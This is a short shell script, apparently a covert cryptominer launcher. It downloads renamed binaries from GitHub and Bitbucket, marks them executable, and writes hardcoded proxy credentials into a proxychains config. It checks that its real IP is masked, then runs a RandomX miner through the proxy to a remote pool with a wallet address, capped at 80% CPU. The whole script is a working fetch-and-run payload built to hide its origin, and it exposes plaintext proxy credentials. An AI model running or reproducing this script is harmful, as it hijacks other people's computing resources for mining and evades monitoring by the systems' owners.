proxy="34.238.108.61" 
port="9293" 
user="e40dupo6wpng2p"  
pass="2a6dj7f91191v2hkpoi6xszv7kn" 
wget -q -O xlarig https://github.com/devinasaliya/super-eureka/raw/main/nevo && chmod +x xlarig
wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/panel && chmod +x panel 
wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/proxychains.conf && chmod +x proxychains.conf 
wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "**********************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./xlarig -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ.8v -a rx/0 -x http://e40dupo6wpng2p:2a6dj7f91191v2hkpoi6xszv7kn@34.238.108.61:9293 --cpu-max-threads-hint=80% -k 
